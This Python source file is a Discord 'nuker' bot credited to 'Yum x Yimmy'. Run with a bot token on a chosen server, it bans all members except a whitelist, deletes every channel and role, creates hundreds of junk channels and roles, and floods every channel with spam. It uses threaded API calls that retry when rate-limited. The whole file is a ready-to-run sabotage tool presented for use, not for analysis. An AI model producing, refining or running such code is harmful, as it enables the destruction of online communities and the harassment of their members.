import discord, os, requests, colorama, random, sys, json, threading, ctypes, time
from colorama import Fore
colorama.init()
intents = discord.Intents.all()

members = open('members.txt')


if sys.platform.startswith("win"):
    ctypes.windll.kernel32.SetConsoleTitleW("External Nuker | Made by Yum x Yimmy")
else:
    pass

client = discord.Client(intents=intents)
info = json.loads(open('config.json','r').read())
def clearer():
    if sys.platform.startswith("win"):
        os.system("cls")
    else:
        os.system("clear")
token = info['token']
headers = {'authorization' : f'Bot {token}'}
banlist = info['blacklist'].split()
def ban_user(user,guild):
    retries = 0
    while True:
        url = f"https://canary.discordapp.com/api/v6/guilds/{str(guild)}/bans/{str(user)}?delete-message-days=7&reason=sex"
        src = requests.put(url, headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def cchan(name, server, type, array):
    retries = 0
    payload = {'name': name, 'type': 0}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/channels", headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            channel = src.json()['id']
            array.append(channel)
            break 
def delete_channel(channel):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/channels/{str(channel)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def delete_role(role, server):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles/{str(role)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def message_spam(message,channel):
    retries = 0
    payload = {"content": message, "tts": False}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{str(channel)}/messages", headers=headers, json=payload,timeout=10)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def create_role(name, server):
    retries = 0
    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
    while True:
        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{server}/roles', headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(3)
            if retries == 5:
                break
        else:
            break

@client.event
async def on_ready():
    clearer()
    print(Fore.RED + "Guilds:" + Fore.RESET)
    if len(client.guilds) == 0:
        print(Fore.RED + "No guilds found")
        exit()
    else:
        for guild in client.guilds:
            print(Fore.WHITE + f"{guild.name} > {guild.id}" + Fore.RESET)
        print(Fore.WHITE + "Guild:" + Fore.RESET)
        guild_id = input()
        if guild_id == "reload":
            print(Fore.RED + "Reloading...")
            clearer()
            os.system(f"python3 nuke.py {token}")
        else:
            try:
                guild = client.get_guild(int(guild_id))
            except:
                print(Fore.RED + "Invalid Guild ID")
                time.sleep(4)
                clearer()
                os.system(f"python3 nuke.py {token}")
        if guild != None:
            channels = []
            clearer()
            def guild_info():
                print(f"""
[{Fore.RED}External{Fore.RESET}]Guild: {guild.name}""")
            guild_info() 
            print(f"""
[{Fore.RED}1{Fore.RESET}] {Fore.WHITE}Ban{Fore.RESET}
[{Fore.RED}2{Fore.RESET}] {Fore.WHITE}Channels{Fore.RESET}
[{Fore.RED}3{Fore.RESET}] {Fore.WHITE}Roles{Fore.RESET}
[{Fore.RED}4{Fore.RESET}] {Fore.WHITE}Spam{Fore.RESET}
""")    
            order = input().split()
            if len(order) == 0:
                print(f"[{Fore.RED}External{Fore.RESET}] Please enter a number...") 
            else:
                queue = threading.Semaphore(value=1)
                for number in order:
                    if number == "1":
                        clearer()
                        guild_info()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"Yimmy: Banning...")
                        else:
                            pass
                        counting = 0
                        print(f"[{Fore.RED}External{Fore.RESET}]Banning..." + Fore.RESET)
                        for member in guild.members:
                            if str(member.id) in banlist:
                                print(Fore.RED + f"Not banning {member.name}" + Fore.RESET)
                            else:
                                threading.Thread(target=ban_user,args=[member.id,guild.id]).start()
                                counting +=1
                        print(f"[{Fore.RED}External{Fore.RESET}]Banned all members")

                    elif number == "3":      
                        clearer()
                        guild_info()
                        x = 0
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"External: Deleting...")
                        else:
                            pass
                        print(f"[{Fore.RED}External{Fore.RESET}]Deleting..."+ Fore.RESET)
                        for role in guild.roles:
                            threading.Thread(target=delete_role,args=[role.id,guild.id]).start()
                            x += 1
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"External: Creating...")
                        else:
                            pass
                        clearer()
                        guild_info()
                        print(f"[{Fore.RED}External{Fore.RESET}]Creating..."+ Fore.RESET)
                        for x in range(100):
                            threading.Thread(target=create_role,args=[info['role'],guild.id]).start()
                    elif number == "2":          
                        clearer()
                        guild_info()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"External: Deleting...")
                        else:
                            pass
                        print(f"[{Fore.RED}External{Fore.RESET}]Deleting..." + Fore.RESET)
                        for channel in guild.channels:
                            threading.Thread(target=delete_channel, args=[channel.id]).start()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"External: Creating...")
                        else:
                            pass
                        clearer()
                        guild_info()
                        print(f"[{Fore.RED}Yimmy{Fore.RESET}]Creating..." +Fore.RESET)
                        for y in range(250):
                            threading.Thread(target=cchan,args=[info['channel'],guild.id,"text",channels]).start()
                    elif number == "4":
                        clearer()
                        guild_info()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"External: Spamming...")
                        else:
                            pass
                        print(f"[{Fore.RED}External{Fore.RESET}]Spamming...")
                        if len(channels) == 0:
                            for x in range(50):
                                for channel in guild.channels:
                                    threading.Thread(target=message_spam,args=[info['spam'],channel.id]).start()
                        else:
                            for x in range(50):
                                for channel in channels:
                                    threading.Thread(target=message_spam,args=[info['spam'],channel]).start()
 
            
        else:
            clearer()
            print("Server is invalid...")
            time.sleep(4)
            os.system(f"python3 nuke.py {token}")
    
try:
    client.run(token)
except Exception as e:
    print(Fore.RED + "Error occured attempting to log in to token... Error will be shown below"+ Fore.RESET)
    time.sleep(1)
    print(Fore.WHITE + f"{e}\nPS: this will close in 5 seconds..." + Fore.RESET)
    time.sleep(5)
    os.system("exit")
